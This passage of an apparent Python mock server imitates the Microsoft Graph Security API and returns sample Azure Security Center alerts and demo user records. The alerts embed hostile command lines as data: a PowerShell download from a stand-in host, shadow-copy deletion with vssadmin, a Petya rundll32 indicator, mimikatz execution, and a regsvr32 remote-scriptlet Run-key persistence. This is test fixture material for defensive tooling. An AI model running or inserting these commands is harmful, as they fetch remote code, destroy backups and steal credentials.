                    "isAzureAdJoined": False,
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "lap-douglasf",
                    "os": "null",
                    "privateIpAddress": "10.8.198.11",
                    "publicIpAddress": "172.16.37.125",
                    "riskScore": "null"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "95.142.39.253",
                    "destinationDomain": "www.fabricam.com",
                    "destinationPort": "null",
                    "destinationUrl": "http://register.fabricam.com/start.php",
                    "direction": "null",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "ipv4",
                    "riskScore": "null",
                    "sourceAddress": "172.16.37.125",
                    "sourcePort": "null",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [
                {
                    "accountName": "null",
                    "commandLine": "powershell -Noninteractive -Noprofile -Command Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://register.fabricam.com/start.php",
                    "createdDateTime": "2019-02-26T09:03:00Z",
                    "integrityLevel": "untrusted",
                    "isElevated": False,
                    "name": "powershell.exe",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "null",
                    "path": "null",
                    "processId": 6434,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "4F12F545-97B2-420E-8FA9-2EB8FD2D6214",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "344d72a7-1b67-426c-bb5a-c14a81f7e675",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "DoubleExtension",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T22:05:56.582321Z",
            "description": "Analysis of host data indicates an execution of a process with a suspicious double extension.\r\nThis extension may trick users into thinking files are safe to be opened and might indicate the presence of malware on the system.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T22:05:51.5182489Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T22:06:00.5563914Z",
            "recommendedActions": [
                "1. Validate with 'M365x594651\\deliad' if this action was intentional. If not, escalate the alert to the information security team.",
                "2. Make sure the machine is completely updated and has an updated Anti-Virus installed.",
                "3. Install and run Microsoftâ€™s Malicious Software Removal Tool (see https://www.microsoft.com/en-us/download/malicious-software-removal-tool-details.aspx).",
                "4. Run Microsoftâ€™s Autoruns utility and try to identify unknown applications that are configured to run at login (see https://technet.microsoft.com/en-us/sysinternals/bb963902.aspx)",
                "5. Run Process Explorer and try to identify unknown running processes (see https://technet.microsoft.com/en-us/sysinternals/bb896653.aspx)."
            ],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Suspicious double extension file executed",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "doubleextension.pdf.exe",
                    "path": "c:\\users\\invest~1\\appdata\\local\\temp\\doubleextension.pdf.exe",
                    "riskScore": "0",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "ip-172-31-1-80.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "ip-172-31-1-80",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [
                {
                    "accountName": "",
                    "commandLine": "",
                    "createdDateTime": "null",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 6420,
                    "fileHash": "null"
                },
                {
                    "accountName": "",
                    "commandLine": "c:\\users\\deliad\\appdata\\local\\temp\\doubleextension.pdf.exe",
                    "createdDateTime": "2018-11-19T22:05:51Z",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 4340,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "deliad",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "deliad@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "BA1AFA7C-206D-4450-988E-D2795D5259F5",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "fdee8146-8bcf-460f-86f3-3f788c285efd",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "Eric",
            "category": "ShadowCopyDelete",
            "closedDateTime": "null",
            "comments": [
                "null"
            ],
            "confidence": 0,
            "createdDateTime": "2020-05-18T20:11:10.6052419Z",
            "description": "Analysis of host data has detected a shadow copy deletion activity on the resource.\r\nVolume Shadow Copy (VSC) is an important artifact that stores data snapshots.\r\nSome malware and specifically Ransomware, targets VSC to sabotage backup strategies.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T20:10:38.0704406Z",
            "feedback": "unknown",
            "lastModifiedDateTime": "2020-05-18T20:11:12.9064986Z",
            "recommendedActions": [
                "1. Validate if this action was intentional. If not, Escalate the alert to the information security team.",
                "2. If not required, consider disabling vssadmin.exe ",
                "3. Make sure the machine is completely updated and has an updated Anti-Virus installed."
            ],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Suspicious Volume Shadow Copy Activity",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "vssadmin.exe",
                    "path": "c:\\windows\\system32\\vssadmin.exe",
                    "riskScore": "0",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "dt-basimk.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "dt-basimk",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [
                {
                    "accountName": "",
                    "commandLine": "c:\\windows\\system32\\vssadmin.exe delete shadows /all /quiet",
                    "createdDateTime": "2018-11-19T20:10:38Z",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 1292,
                    "fileHash": "null"
                },
                {
                    "accountName": "",
                    "commandLine": "",
                    "createdDateTime": "null",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 776,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "OpsSec12R2-WEU",
                    "domainName": "WORKGROUP",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "WORKGROUP\\OpsSec12R2-WEU"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "AD5D3084-CB9A-45D5-9AA0-81EF680C20D4",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "344d72a7-1b67-426c-bb5a-c14a81f7e675",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "Petya",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T20:05:56.6694109Z",
            "description": "Analysis of host data on lap-christiec detected indicators associated with Petya ransomware. See https://blogs.technet.microsoft.com/mmpc/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/ for more information. Review the commandline associated in this alert and escalate this alert to your security team.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T20:05:53.7670456Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T20:05:59.8155181Z",
            "recommendedActions": [
                "1. Run a full anti-malware scan and verify that the threat was removed",
                "2. Install and run Microsoftâ€™s Malicious Software Removal Tool (see http://www.microsoft.com/security/pc-security/malware-removal.aspx)",
                "3. Perform these actions pre-emptively on other hosts in your network."
            ],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Detected Petya ransomware indicators",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "cmd.exe",
                    "path": "c:\\windows\\system32\\cmd.exe",
                    "riskScore": "0",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "lap-christiec.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "lap-christiec",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [
                {
                    "category": "Ransomware",
                    "family": "Petya",
                    "name": "",
                    "severity": "",
                    "wasRunning": False
                }
            ],
            "networkConnections": [],
            "processes": [
                {
                    "accountName": "",
                    "commandLine": "cmd  /c echo rundll32.exe perfc.dat",
                    "createdDateTime": "2018-11-19T20:05:53Z",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 2124,
                    "fileHash": "null"
                },
                {
                    "accountName": "",
                    "commandLine": "",
                    "createdDateTime": "null",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 1364,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "christiec",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "christiec@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "C037F5DE-DE6C-47CB-8A11-300EC42D94D1",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "344d72a7-1b67-426c-bb5a-c14a81f7e675",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "KnownCredentialAccessTools",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T19:50:42.9424253Z",
            "description": "Machine logs indicate that the suspicious process: 'c:\\users\\pattif\\appdata\\local\\temp\\mimikatz.exe' was running on the machine, often associated with attacker attempts to access credentials.'",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T19:50:39.3772751Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T19:50:47.0011912Z",
            "recommendedActions": [
                "1. Run Process Explorer and try to identify unknown running processes (see https://technet.microsoft.com/en-us/sysinternals/bb896653.aspx)",
                "2. Escalate the alert to the information security team",
                "3. Make sure the machine is completely updated and has an updated anti-malware application installed",
                "4. Run a full anti-malware scan and verify that the threat was removed",
                "5. Install and run Microsoft's Malicious Software Removal Tool (see https://www.microsoft.com/en-us/download/malicious-software-removal-tool-details.aspx)",
                "6. Run Microsoft's Autoruns utility and try to identify unknown applications that are configured to run at login (see https://technet.microsoft.com/en-us/sysinternals/bb963902.aspx)"
            ],
            "severity": "high",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Suspicious process executed",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "mimikatz.exe",
                    "path": "c:\\users\\pattif\\appdata\\local\\temp\\mimikatz.exe",
                    "riskScore": "0",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "lap-pattif.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "lap-pattif",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [
                {
                    "accountName": "",
                    "commandLine": "",
                    "createdDateTime": "null",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 3108,
                    "fileHash": "null"
                },
                {
                    "accountName": "",
                    "commandLine": ".\\mimikatz.exe",
                    "createdDateTime": "2018-11-19T19:50:39Z",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 8076,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "pattif",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "pattif@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "597E99F8-50B6-4D7B-A45A-A35BDB35EFF8",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "344d72a7-1b67-426c-bb5a-c14a81f7e675",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "SuspiciousSystemProcess",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T19:50:42.9424253Z",
            "description": "The system process c:\\windows\\fonts\\csrss.exe was observed running in an abnormal context. Malware often use this process name to masquerade its malicious activity.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T19:50:39.2414086Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T19:50:45.1729381Z",
            "recommendedActions": [
                "1. Run Process Explorer and try to identify unknown running processes (see https://technet.microsoft.com/en-us/sysinternals/bb896653.aspx)",
                "2. Make sure the machine is completely updated and has an updated anti-malware application installed",
                "3. Run a full anti-malware scan and verify that the threat was removed",
                "4. Install and run Microsoftâ€™s Malicious Software Removal Tool (see https://www.microsoft.com/en-us/download/malicious-software-removal-tool-details.aspx)",
                "5. Run Microsoftâ€™s Autoruns utility and try to identify unknown applications that are configured to run at login (see https://technet.microsoft.com/en-us/sysinternals/bb963902.aspx)"
            ],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Suspicious system process executed",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "csrss.exe",
                    "path": "c:\\windows\\fonts\\csrss.exe",
                    "riskScore": "0",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "dt-aldom.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "DT-ALDOM",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [
                {
                    "accountName": "",
                    "commandLine": "c:\\windows\\fonts\\csrss.exe",
                    "createdDateTime": "2018-11-19T19:50:39Z",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 5544,
                    "fileHash": "null"
                },
                {
                    "accountName": "",
                    "commandLine": "",
                    "createdDateTime": "null",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 3108,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "32383C11-2C85-4BBA-A7C5-A8B496BE8EC3",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "AnonymousAccessAnomaly",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T19:36:47.3871998Z",
            "description": "Someone has anonymously accessed your Azure Storage account 'storagetdeidata3'.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T19:36:45.851Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T19:36:50.8423614Z",
            "recommendedActions": [
                "Be sure to follow the principle of 'least privilege' and limit access to your data."
            ],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Anonymous access",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [],
            "vulnerabilityStates": []
        },
        {
            "id": "27B029BD-4046-46D6-8EDD-261E89B11D83",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "e2dc3810-f8e5-4337-a41c-8b9ec7d954ee",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "Modified system binary discovered",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T19:20:50.1408629Z",
            "description": "Crash dump analysis detected system module modification within a crash dump from the process identified in this alert.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T19:09:06Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T19:20:51.5427788Z",
            "recommendedActions": [
                "Correlate this event with other security information to determine the security status of this host."
            ],
            "severity": "informational",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Modified system binary discovered",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "lap-pattif.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "lap-pattif",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "pattif",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "pattif@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "A0E84336-A9E2-4E41-8CC4-B8234FC9276D",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "519db638-3a83-4e3b-b0c5-ef7fbee62143",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "SuspiciousActivity",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T18:27:30.2219012Z",
            "description": "Analysis of host data has detected a sequence of one or more processes running on lap-douglasf that have historically been associated with malicious activity. While individual commands may appear benign the alert is scored based on an aggregation of these commands. This could either be legitimate activity, or an indication of a compromised host.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T16:01:32Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T18:27:31.4680482Z",
            "recommendedActions": [
                "Review each of the individual line items in this alert to see if you recognise them as legitimate administrative activity."
            ],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Suspicious Activity Detected",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "lap-douglasf.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "LAP-DOUGLASF",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "E2E0D595-C13C-43B6-BA6E-FD5BFA9AAF5A",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "519db638-3a83-4e3b-b0c5-ef7fbee62143",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "RegistryPersistence",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T16:15:30.129774Z",
            "description": "Analysis of host data has detected an attempt to persist an executable in the Windows registry.\r\nMalware often uses such a technique to survive a boot.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T16:14:53.6246312Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T16:15:32.7765105Z",
            "recommendedActions": [
                "1. Verify the legitimacy of the persisted process: 'regsvr32 /u /s /i:http://www.wingtiptoys.com/stext.sct scrobj.dll'",
                "2. Validate with 'ASCJP-DEF\\jplesage' if this action was intentional",
                "3. Run Microsoftâ€™s Autoruns utility and try to identify unknown applications that are configured to run at login (see https://technet.microsoft.com/en-us/sysinternals/bb963902.aspx)",
                "4. Run a full anti-malware scan and verify that the threat was removed",
                "5. Install and run Microsoftâ€™s Malicious Software Removal Tool (see http://www.microsoft.com/security/pc-security/malware-removal.aspx)"
            ],
            "severity": "low",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Windows registry persistence method detected",
            "vendorInformation": {
                "provider": "Azure Security Center",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "reg.exe",
                    "path": "c:\\windows\\system32\\reg.exe",
                    "riskScore": "0",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "x1-alicel.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": "null",
                    "isAzureAdRegistered": "null",
                    "isHybridAzureDomainJoined": False,
                    "netBiosName": "x1-alicel",
                    "os": "",
                    "privateIpAddress": "null",
                    "publicIpAddress": "null",
                    "riskScore": "0"
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [
                {
                    "accountName": "",
                    "commandLine": "",
                    "createdDateTime": "null",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 2364,
                    "fileHash": "null"
                },
                {
                    "accountName": "",
                    "commandLine": "reg  add hklm\\software\\microsoft\\windows\\currentversion\\run /v \"start\" /d \"regsvr32 /u /s /i:http://www.wingtiptoys.com/stext.sct scrobj.dll\" /f",
                    "createdDateTime": "2018-11-19T16:14:53Z",
                    "integrityLevel": "unknown",
                    "isElevated": False,
                    "name": "",
                    "parentProcessCreatedDateTime": "null",
                    "parentProcessId": "null",
                    "parentProcessName": "",
                    "path": "",
                    "processId": 1368,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "alicel",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "alicel@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        }
    ]}
    ]
    return json.dumps(result)

@msgraphsecurity_api.route(f'/{BASE_URL}/users')
def get_users():
    result =[
        {
    "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users",
    "value": [
        {
            "businessPhones": [],
            "displayName": "Conf Room Adams",
            "givenName": "null",
            "jobTitle": "null",
            "mail": "Adams@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "null",
            "preferredLanguage": "null",
            "surname": "null",
            "userPrincipalName": "Adams@M365x214355.onmicrosoft.com",
            "id": "6e7b768e-07e2-4810-8459-485f84f8f204"
        },
        {
            "businessPhones": [
                "+1 425 555 0109"
            ],
            "displayName": "Adele Vance",
            "givenName": "Adele",
            "jobTitle": "Product Marketing Manager",
            "mail": "AdeleV@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "18/2111",
            "preferredLanguage": "en-US",
            "surname": "Vance",
            "userPrincipalName": "AdeleV@M365x214355.onmicrosoft.com",
            "id": "87d349ed-44d7-43e1-9a83-5f2406dee5bd"
        },
        {
            "businessPhones": [
                "8006427676"
            ],
            "displayName": "MOD Administrator",
            "givenName": "MOD",
            "jobTitle": "null",
            "mail": "admin@M365x214355.onmicrosoft.com",
            "mobilePhone": "5555555555",
            "officeLocation": "null",
            "preferredLanguage": "en-US",
            "surname": "Administrator",
            "userPrincipalName": "admin@M365x214355.onmicrosoft.com",
            "id": "5bde3e51-d13b-4db1-9948-fe4b109d11a7"
        },
        {
            "businessPhones": [
                "+1 858 555 0110"
            ],
            "displayName": "Alex Wilber",
            "givenName": "Alex",
            "jobTitle": "Marketing Assistant",
            "mail": "AlexW@M365x214355.onmicrosoft.com",
            "mobilePhone": "null",
            "officeLocation": "131/1104",
            "preferredLanguage": "en-US",
            "surname": "Wilber",
            "userPrincipalName": "AlexW@M365x214355.onmicrosoft.com",
            "id": "4782e723-f4f4-4af3-a76e-25e3bab0d896"
        },
        {
            "businessPhones": [
                "+1 262 555 0106"
            ],
            "displayName": "Allan Deyoung",
            "givenName": "Allan",
